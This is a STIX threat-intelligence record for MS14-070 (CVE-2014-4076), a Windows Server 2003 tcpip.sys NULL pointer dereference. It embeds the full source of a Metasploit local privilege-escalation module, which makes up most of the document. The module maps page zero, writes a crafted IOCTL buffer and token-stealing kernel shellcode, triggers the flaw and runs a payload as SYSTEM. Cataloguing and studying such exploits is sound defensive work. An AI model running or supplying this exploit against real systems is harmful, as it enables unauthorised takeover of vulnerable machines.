{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--91352b46-b2cc-4b32-9161-a74c1af4c1a8",
    "created": "2024-08-14T16:49:44.31717Z",
    "modified": "2024-08-14T16:49:44.317174Z",
    "name": "MS14-070 Windows tcpip!SetAddrOptions NULL Pointer Dereference",
    "description": " A vulnerability within the Microsoft TCP/IP protocol driver tcpip.sys can allow a local attacker to trigger a NULL pointer dereference by using a specially crafted IOCTL. This flaw can be abused to elevate privileges to SYSTEM.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms14_070_tcpip_ioctl.rb",
            "external_id": "ms14_070_tcpip_ioctl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-4076"
        },
        {
            "source_name": "reference",
            "url": "https://blog.korelogic.com/blog/2015/01/28/2k3_tcpip_setaddroptions_exploit_dev"
        },
        {
            "source_name": "reference",
            "url": "https://www.korelogic.com/Resources/Advisories/KL-001-2015-001.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = AverageRanking\n\n  include Msf::Exploit::Local::WindowsKernel\n  include Msf::Post::File\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'MS14-070 Windows tcpip!SetAddrOptions NULL Pointer Dereference',\n          'Description' => %q{\n            A vulnerability within the Microsoft TCP/IP protocol driver tcpip.sys\n            can allow a local attacker to trigger a NULL pointer dereference by using a\n            specially crafted IOCTL. This flaw can be abused to elevate privileges to\n            SYSTEM.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Matt Bergin <level[at]korelogic.com>', # Vulnerability discovery and PoC\n            'Jay Smith <jsmith[at]korelogic.com>' # MSF module\n          ],\n          'Arch' => ARCH_X86,\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread',\n          },\n          'Targets' => [\n            [\n              'Windows Server 2003 SP2',\n              {\n                '_KPROCESS' => \"\\x38\",\n                '_TOKEN' => \"\\xd8\",\n                '_UPID' => \"\\x94\",\n                '_APLINKS' => \"\\x98\"\n              }\n            ]\n          ],\n          'References' => [\n            ['CVE', '2014-4076'],\n            ['MSB', 'MS14-070'],\n            ['OSVDB', '114532'],\n            ['URL', 'https://blog.korelogic.com/blog/2015/01/28/2k3_tcpip_setaddroptions_exploit_dev'],\n            ['URL', 'https://www.korelogic.com/Resources/Advisories/KL-001-2015-001.txt']\n          ],\n          'DisclosureDate' => '2014-11-11',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n                stdapi_sys_process_attach\n                stdapi_sys_process_memory_write\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    if sysinfo[\"Architecture\"] == ARCH_X64\n      return Exploit::CheckCode::Safe\n    end\n\n    handle = open_device('\\\\\\\\.\\\\tcp', 0, 'FILE_SHARE_READ', 'OPEN_EXISTING')\n    return Exploit::CheckCode::Safe unless handle\n\n    session.railgun.kernel32.CloseHandle(handle)\n\n    file_path = get_env('WINDIR') << \"\\\\system32\\\\drivers\\\\tcpip.sys\"\n    unless file?(file_path)\n      return Exploit::CheckCode::Unknown\n    end\n\n    major, minor, build, revision, branch = file_version(file_path)\n    vprint_status(\"tcpip.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}\")\n\n    if (\"#{major}.#{minor}.#{build}\" == \"5.2.3790\" && revision < 5440)\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if sysinfo[\"Architecture\"] == ARCH_X64\n      fail_with(Failure::NoTarget, \"Running against 64-bit systems is not supported\")\n    end\n\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, \"Exploit not available on this system\")\n    end\n\n    handle = open_device('\\\\\\\\.\\\\tcp', 0, 'FILE_SHARE_READ', 'OPEN_EXISTING')\n    if handle.nil?\n      fail_with(Failure::NoTarget, \"Unable to open \\\\\\\\.\\\\tcp device\")\n    end\n\n    print_status(\"Storing the shellcode in memory...\")\n    this_proc = session.sys.process.open\n\n    session.railgun.ntdll.NtAllocateVirtualMemory(-1, [0x1000].pack('V'), nil, [0x4000].pack('V'), \"MEM_RESERVE|MEM_COMMIT\", \"PAGE_EXECUTE_READWRITE\")\n\n    unless this_proc.memory.writable?(0x1000)\n      fail_with(Failure::Unknown, 'Failed to allocate memory')\n    end\n\n    buf = \"\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x22\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\"\n\n    sc = token_stealing_shellcode(target, nil, nil, false)\n    # move up the stack frames looking for nt!KiSystemServicePostCall\n    sc << \"\\x31\\xc9\"                     # xor ecx, ecx\n    sc << \"\\x89\\xeb\"                     # mov ebx, ebp\n    # count_frames\n    sc << \"\\x41\"                         # inc ecx\n    sc << \"\\xf7\\x43\\x04\\x00\\x00\\x00\\x80\" # test dword [ebx+4], 0x80000000\n    sc << \"\\x8b\\x1b\"                     # mov ebx, dword [ebx]\n    sc << \"\\x75\\xf4\"                     # jne short count_frames\n    sc << \"\\x49\"                         # dec ecx\n    # loop_frames\n    sc << \"\\x49\"                         # dec ecx\n    sc << \"\\x89\\xec\"                     # mov esp, ebp\n    sc << \"\\x5d\"                         # pop ebp\n    sc << \"\\x83\\xf9\\x00\"                 # cmp ecx, 0\n    sc << \"\\x75\\xf7\"                     # jne loop_frames\n    sc << \"\\x31\\xc0\"                     # xor eax, eax\n    sc << \"\\xc3\"                         # ret\n\n    this_proc.memory.write(0x28, \"\\x87\\xff\\xff\\x38\")\n    this_proc.memory.write(0x38, \"\\x00\\x00\")\n    this_proc.memory.write(0x1100, buf)\n    this_proc.memory.write(0x2b, \"\\x00\\x00\")\n    this_proc.memory.write(0x2000, sc)\n\n    print_status(\"Triggering the vulnerability...\")\n    session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x00120028, 0x1100, buf.length, 0, 0)\n    # session.railgun.kernel32.CloseHandle(handle) # CloseHandle will never return, so skip it\n\n    print_status(\"Checking privileges after exploitation...\")\n\n    unless is_system?\n      fail_with(Failure::Unknown, \"The exploitation wasn't successful\")\n    end\n\n    print_good(\"Exploitation successful!\")\n    unless execute_shellcode(payload.encoded, nil, this_proc.pid)\n      fail_with(Failure::Unknown, 'Error while executing the payload')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-11",
    "x_mitre_platforms": [
        "win'"
    ]
}